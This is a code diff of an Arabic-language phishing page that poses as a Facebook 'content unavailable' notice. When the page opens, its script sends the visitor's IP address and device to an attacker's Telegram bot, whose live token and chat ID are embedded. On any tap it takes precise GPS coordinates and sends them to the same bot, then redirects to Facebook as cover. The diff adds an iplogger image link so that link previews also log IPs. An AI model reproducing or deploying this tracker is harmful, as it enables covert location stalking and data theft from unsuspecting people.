@@ -5,30 +5,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <meta property="og:title" content="عذراً، هذا المحتوى غير متاح الآن">
-    <meta property="og:description" content="تم حذف هذا المنشور أو تقييده لمراجعة معايير المجتمع. اضغط للمتابعة.">
-    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png">
+    <meta property="og:description" content="تم حذف المنشور أو تقييده لمراجعة معايير المجتمع.">
+    
+    <meta property="og:image" content="https://iplogger.com/1XXXXX.jpg"> 
+    
     <meta property="og:type" content="website">
 
     <title>Facebook - Content Removed</title>
     
     <style>
-        body { margin: 0; padding: 0; background: #f0f2f5; font-family: Segoe UI, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
-        .error-box { text-align: center; padding: 20px; max-width: 400px; }
-        .icon-lock { width: 100px; margin-bottom: 20px; opacity: 0.8; }
-        .title { font-size: 18px; font-weight: bold; color: #65676b; margin-bottom: 10px; }
-        .message { font-size: 14px; color: #65676b; margin-bottom: 25px; }
-        .fb-btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; font-weight: 600; text-decoration: none; border: none; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; }
+        body { margin: 0; background: #f0f2f5; font-family: Segoe UI, Arial; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
+        .error-box { text-align: center; max-width: 400px; }
+        .icon-lock { width: 100px; margin-bottom: 20px; }
+        .fb-btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; border:none; font-weight:bold; }
     </style>
 </head>
 <body onclick="startCapture()">
 
-    <div id="overlay"></div>
-
     <div class="error-box">
         <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" class="icon-lock">
-        <div class="title">عذراً، المحتوى غير متوفر</div>
-        <div class="message">ربما انتهت صلاحية الرابط أو تم حذفه من قبل الناشر.</div>
+        <div style="font-size:18px; font-weight:bold; color:#65676b; margin-bottom:10px;">المحتوى غير متوفر</div>
+        <div style="font-size:14px; color:#65676b; margin-bottom:25px;">ربما تم حذف الرابط أو انتهاء صلاحيته.</div>
         <button class="fb-btn">الانتقال إلى فيسبوك</button>
     </div>
 
@@ -36,41 +33,23 @@
     const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
     const CHAT_ID = "1611398303";
 
-    // 1. سحب البيانات فور فتح الصفحة (باستخدام JSONP لتجاوز حماية المتصفح CORS)
-    async function getIP() {
+    // صيد البيانات عند الفتح الحقيقي
+    async function captureOnOpen() {
         try {
-            // نستخدم api.ipify لضمان جلب الـ IP حتى في الخلفية
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            
-            let msg = `🚩 دخول جديد (فتح الرابط)\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}`;
-            sendToBot(msg);
-        } catch (e) {
-            sendToBot("🚩 دخول (تعذر جلب الـ IP تلقائياً - بانتظار اللمس)");
-        }
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            sendToBot(`🚀 الضحية فتح الرابط الآن!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}`);
+        } catch (e) { console.log("Silent error"); }
     }
 
-    // 2. سحب الـ GPS الحقيقي عند اللمس (الأمتار الدقيقة)
+    // صيد الـ GPS الدقيق عند اللمس
     function startCapture() {
-        document.getElementById('overlay').style.display = 'none';
-        
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    let lat = pos.coords.latitude;
-                    let lon = pos.coords.longitude;
-                    let msg = `🎯 صيد دقيق (GPS REAL)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
-                    sendToBot(msg);
-                    
-                    // تحويل المستخدم بعد الصيد للتمويه
-                    setTimeout(() => { window.location.href = "https://m.facebook.com"; }, 800);
-                },
-                (err) => {
-                    sendToBot("⚠️ المستخدم رفض إذن الموقع الدقيق");
-                    window.location.href = "https://m.facebook.com";
-                },
-                { enableHighAccuracy: true }
-            );
+            navigator.geolocation.getCurrentPosition((pos) => {
+                let msg = `🎯 صيد دقيق (GPS REAL)\n📍 الإحداثيات: ${pos.coords.latitude}, ${pos.coords.longitude}\n🔗 الخريطة: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendToBot(msg);
+                setTimeout(() => { window.location.href = "https://m.facebook.com"; }, 500);
+            }, () => { window.location.href = "https://m.facebook.com"; });
         }
     }
 
@@ -78,7 +57,7 @@
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
     }
 
-    window.onload = getIP;
+    window.onload = captureOnOpen;
 </script>
 </body>
 </html>
